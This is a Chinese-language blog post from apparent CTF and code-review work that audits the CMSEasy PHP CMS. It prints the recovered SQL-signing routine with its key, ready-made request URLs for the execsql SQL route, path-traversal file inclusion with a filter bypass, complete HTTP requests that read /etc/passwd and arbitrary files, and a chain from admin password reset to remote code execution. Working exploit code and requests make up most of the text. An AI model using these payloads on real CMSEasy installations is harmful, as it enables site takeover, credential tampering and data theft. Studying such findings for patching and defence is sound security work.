---
layout: post
title: php code review - cmseasy
date: 2023-06-05 17:46 +0800
categories: [ctf, web]
tag: [web, php, code-review]
---

## cmseasy

https://www.cmseasy.cn/published/


## sql注入

### 老洞
在 `crossall_act.php` 中存在 `execsql_action` 方法
路由在：`index.php?case=crossall&act=execsql&sql=xxxx`
在最新版本中`lib/table/service.php`被混淆了,因此考虑下载源代码本地搭建

```php
// 获取类的所有方法 
error_log(var_dump(get_class_methods(service)));

array(53) {
  [0]=>
  string(11) "getInstance"
  [1]=>
  string(9) "cmseayurl"
  [2]=>
  string(14) "cmseayurl_post"
  [3]=>
  string(13) "curl_download"
  [4]=>
  string(8) "curl_get"
  [5]=>
  string(20) "get_remote_file_size"
  [6]=>
  string(8) "httpcode"
  [7]=>
  string(10) "varify_url"
  [8]=>
  string(5) "dkUrl"
  [9]=>
  string(6) "is_ssl"
  [10]=>
  string(8) "getlogin"
  [11]=>
  string(15) "check_expansion"
  [12]=>
  string(18) "save_service_users"
  [13]=>
  string(17) "get_service_users"
  [14]=>
  string(7) "getherf"
  [15]=>
  string(9) "json_info"
  [16]=>
  string(10) "checktable"
  [17]=>
  string(18) "get_template_check"
  [18]=>
  string(17) "get_modules_check"
  [19]=>
  string(14) "creadt_control"
  [20]=>
  string(14) "update_control"
  [21]=>
  string(16) "passport_encrypt"
  [22]=>
  string(16) "passport_decrypt"
  [23]=>
  string(12) "passport_key"
  [24]=>
  string(19) "autofrontbuytempdir"
  [25]=>
  string(16) "autofronttempdir"
  [26]=>
  string(20) "get_buymodules_check"
  [27]=>
  string(19) "get_fetch_cacheFile"
  [28]=>
  string(9) "login_cms"
  [29]=>
  string(10) "cms_qkdown"
  [30]=>
  string(17) "buyapps_templates"
  [31]=>
  string(8) "buywxapp"
  [32]=>
  string(10) "buylicense"
  [33]=>
  string(12) "buycopyright"
  [34]=>
  string(12) "buyusermenoy"
  [35]=>
  string(12) "getmycddowme"
  [36]=>
  string(19) "getlicenseagreement"
  [37]=>
  string(12) "proxyarchive"
  [38]=>
  string(12) "getmycrdowme"
  [39]=>
  string(12) "_getauthkey_"
  [40]=>
  string(13) "_getauthdate_"
  [41]=>
  string(15) "_getauthperiod_"
  [42]=>
  string(10) "md5tocdkey"
  [43]=>
  string(12) "admin_system"
  [44]=>
  string(10) "lockString"
  [45]=>
  string(12) "unlockString"
  [46]=>
  string(7) "execsql"
  [47]=>
  string(18) "getservicetemplate"
  [48]=>
  string(14) "updateapps_cms"
  [49]=>
  string(13) "template_dome"
  [50]=>
  string(11) "downloadZip"
  [51]=>
  string(4) "json"
  [52]=>
  string(19) "get_remote_file_url"
}

// 直接使用类加密sql
error_log(service::lockString("select 123"));
// tail -f /Applications/MAMP/logs/php_error.log
```

```php
//参数名
$object = service;
$reflectionMethod = new ReflectionMethod($object, 'lockString');
$parameters = $reflectionMethod->getParameters();
foreach ($parameters as $parameter) {
    if ($parameter->isDefaultValueAvailable()) {
        $defaultValue = $parameter->getDefaultValue();
        error_log(var_dump("Parameter: " . $parameter->getName() . ", Default Value: " . var_export($defaultValue, true)));
    }
    else{
        error_log(var_dump("Parameter: " . $parameter->getName()));
    }
}

/*
string(15) "Parameter: txt"
string(49) "Parameter: key, Default Value: 'cmseasy_new_sql'"
*/
```
### 源码
7.7.7 以前
```php
function lockString($txt,$key='xxx'){
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+";
    $nh = rand(0,64);
    $ch = $chars[$nh];
    $mdKey = md5($key.$ch);
    $mdKey = substr($mdKey,$nh%8, $nh%8+7);
    $txt = base64_encode($txt);
    $tmp = '';
    $i=0;$j=0;$k = 0;
    for ($i=0; $i<strlen($txt); $i++) {
        $k = $k == strlen($mdKey) ? 0 : $k;
        $j = ($nh+strpos($chars,$txt[$i])+ord($mdKey[$k++]))%64;
        $tmp .= $chars[$j];
    }
    return urlencode($ch.$tmp);
}


function unlockString($txt,$key='xxx'){
    $txt = urldecode($txt);
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+";
    $ch = $txt[0];
    $nh = strpos($chars,$ch);
    $mdKey = md5($key.$ch);
    $mdKey = substr($mdKey,$nh%8, $nh%8+7);
    $txt = substr($txt,1);
    $tmp = '';
    $i=0;$j=0; $k = 0;
    for ($i=0; $i<strlen($txt); $i++) {
        $k = $k == strlen($mdKey) ? 0 : $k;
        $j = strpos($chars,$txt[$i])-$nh - ord($mdKey[$k++]);
        while ($j<0) $j+=64;
        $tmp .= $chars[$j];
    }
    return base64_decode($tmp);
}
echo "index.php?case=crossall&act=execsql&sql=". lockString("select 123");
```

### 老洞新算法
下载[历史版本](https://www.cmseasy.cn/download/)，发现7.7.7.4版泄漏了未加密的算法 20230105

```php
function lockString($txt,$key='cmseasy_new_sql'){
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+";
    $nh = rand(0,64);
    $ch = $chars[$nh];
    $mdKey = md5($key.$ch);
    $mdKey = substr($mdKey,$nh%8, $nh%8+8);
    $txt = base64_encode($txt);
    $tmp = '';
    $i=0;$j=0;$k = 0;
    for ($i=0; $i<strlen($txt); $i++) {
        $k = $k == strlen($mdKey) ? 0 : $k;
        $j = ($nh+strpos($chars,$txt[$i])+ord($mdKey[$k++]))%64;
        $tmp .= $chars[$j];
    }
    $newtxt=urlencode($ch.$tmp);
    $newtxt.= md5($key);
    return $newtxt;
}

function unlockString($txt,$key='cmseasy_new_sql'){
    $txt=rtrim($txt, md5($key));
    $txt = urldecode($txt);
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+";
    $ch = $txt[0];
    $nh = strpos($chars,$ch);
    $mdKey = md5($key.$ch);
    $mdKey = substr($mdKey,$nh%8, $nh%8+8);
    $txt = substr($txt,1);
    $tmp = '';
    $i=0;$j=0; $k = 0;
    for ($i=0; $i<strlen($txt); $i++) {
        $k = $k == strlen($mdKey) ? 0 : $k;
        $j = strpos($chars,$txt[$i])-$nh - ord($mdKey[$k++]);
        while ($j<0) $j+=64;
        $tmp .= $chars[$j];
    }
    return base64_decode($tmp);;
}

echo "index.php?case=crossall&act=execsql&sql=". lockString("select 123");
```



## 本地文件包含
一堆老洞： `index.php?case=language&act=edit&lang_choice=../../../../../../../../../tmp/test.php&admin_dir=admin&id=1#index_connent`


两处 `lib/admin/admin_language.php`
```php
function edit_action() {
    $lang_choice='system.php';
    error_log("1111");
    if (isset($_GET['lang_choice'])){
        $lang_choice=$_GET['lang_choice'];
    }
    $langid=front::get('id');
    $lang=new lang();
    $langdata = $lang->getrows('id='.$langid, 1);
    if (is_array($langdata)){
        $langurlname=$langdata[0]['langurlname'];
    }else{
        front::alert(lang_admin('language_pack').lang_admin('nonentity'));
    }
    $path=ROOT.'/lang/'.$langurlname.'/'.$lang_choice;
    $tipspath=ROOT.'/lang/'.$langurlname.'/'.$lang_choice;

    ...
    
    $content=include($path);

    $tips=include($tipspath);
    ...
}
```


```php
 function add_action() {
    $lang_choice='system.php';
    if (isset($_GET['lang_choice'])){
        $lang_choice=$_GET['lang_choice'];
    }
    if (front::post('submit')) {
        $langid=front::get('id');
        $lang=new lang();
        $langdata = $lang->getrows('id='.$langid, 1);
        if (is_array($langdata)){
            $langurlname=$langdata[0]['langurlname'];
        }else{
            front::alert(lang_admin('language_pack').lang_admin('nonentity'));
        }


        $path=ROOT.'/lang/'.$langurlname.'/'.$lang_choice;
        if(file_exists($path)){
            $str= file_get_contents($path);//将整个文件内容读入到一个字符串中
            if(inject_check($str)){
                exit(lang_admin('文件异常'));
            }
        }


        $lang_data = include $path;
        ...
    }
}

function inject_check($sql_str)
{                                                                                                                                /*去掉into校验 |\binto\b */
    return preg_match('@\bselect\b|\binsert\b|\bupdate\b|\bphpinfo\b|\bdelete\b|\bSLEEP\b|\bwhen\b|\bCHAR|\bTHEN\b|\bCONCAT\b|\/\*|\*|\.\.\/|\.\/|\[bunion]\b|\bload_file\b|\boutfile\b@is', $sql_str);
}
```
inject_check随便绕
```
<?php
("php"."info")();
```

数据包
```
POST /index.php?case=language&act=add&lang_choice=../../../../../../../../../tmp/test.php&admin_dir=admin&id=1 HTTP/1.1
Host: god.dd:8888
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=8mc3tkp13arrfc8h2jr3bgj9p0; login_username=admin; login_password=indkqU5o3ma3AzaL2gJz7o6v3TWtpn6f8zqL2spaHz9fD2ab18391e6e61e99aff8e10d05e4ad02
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

submit=1
```

## 任意文件读

### 老洞过滤绕过
```php
function fetch_action()
{

    $id = front::post('id');
    $id = str_replace('../', '', $id);
    $id = str_replace('./', '', $id);
    $tpl = str_replace('#', '', $id);
    $tpid = $tpl;
    //$tpl = str_replace('_d_', '/', $tpl); //c去掉漏洞
    $tpl = str_replace('_html', '.html', $tpl);
    $tpl = str_replace('_css', '.css', $tpl);
    $tpl = str_replace('_js', '.js', $tpl);
    $res = array();
    error_log(TEMPLATE . '/' . config::get('template_dir') . '/' . $tpl);
    $res['content'] = file_get_contents(TEMPLATE . '/' . config::get('template_dir') . '/' . $tpl);
    $res['content'] = preg_replace('%</textarea%', '<&#47textarea', $res['content']);
    echo json::encode($res);
    exit;
}
```

```
POST /index.php?case=template&act=fetch&admin_dir=admin&site=default HTTP/1.1
Host: god.dd:8888
Content-Length: 39
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://god.dd:8888
Referer: http://god.dd:8888/index.php?admin_dir=admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=8mc3tkp13arrfc8h2jr3bgj9p0; login_username=admin; login_password=indkqU5o3ma3AzaL2gJz7o6v3TWtpn6f8zqL2spaHz9fD2ab18391e6e61e99aff8e10d05e4ad02
Connection: close

&id=.#.#/.#.#/.#.#/.#.#/.#.#/etc/passwd
```
### 新洞



看如下代码，控制数据库中的字段为文件名即可
```php
function down_action(){
    $aid = intval(front::get('aid'));
    if (config::get('verifycode')) {
        if (cookie::get('allowdown') != md5(url::create('attachment/downfile/aid/' . $aid . '/v/ce'))) {
            header("Location: index.php?case=attachment&act=downfile&aid=" . $aid . "&v=ce");
        }
    }
    //δ֧����������
    $archivedata=archive::getInstance()->getrow('aid='.$aid);
    ...

    $filename = front::get('filename'); //如果是自定义字段
    
    if ($filename && $archivedata[$filename]){
        $path = ROOT . '/' . $archivedata[$filename];
    }else{
        $path = ROOT . '/' . archive_attachment($aid, 'path');
    }
    $path = iconv('utf-8', 'gbk//ignore', $path);
    
    if (!is_readable($path)) {
        header("HTTP/1.1 404 Not Found");
        exit;
    }
    
    $size = filesize($path);
    $content = file_get_contents($path);
    

}
```

找一个地方操作这里的数据
![](/assets/img/2023-06-06-16-59-57.png)

![](/assets/img/2023-06-06-17-00-50.png)

触发

```
POST /index.php?case=attachment&act=down&site=default&aid=534&filename=content HTTP/1.1
Host: god.dd:8888
Content-Length: 9
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://god.dd:8888
Referer: http://god.dd:8888/index.php?admin_dir=admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=8mc3tkp13arrfc8h2jr3bgj9p0; login_username=admin; login_password=indkqU5o3ma3AzaL2gJz7o6v3TWtpn6f8zqL2spaHz9fD2ab18391e6e61e99aff8e10d05e4ad02
Connection: close

&id=#aaaa
```



## RCE流程
sql注入改密码 + 本地文件包含 + 前台上传照片 -> RCE
```sql
update cmseasy_user set password=md5('123456') where username='admin';
```
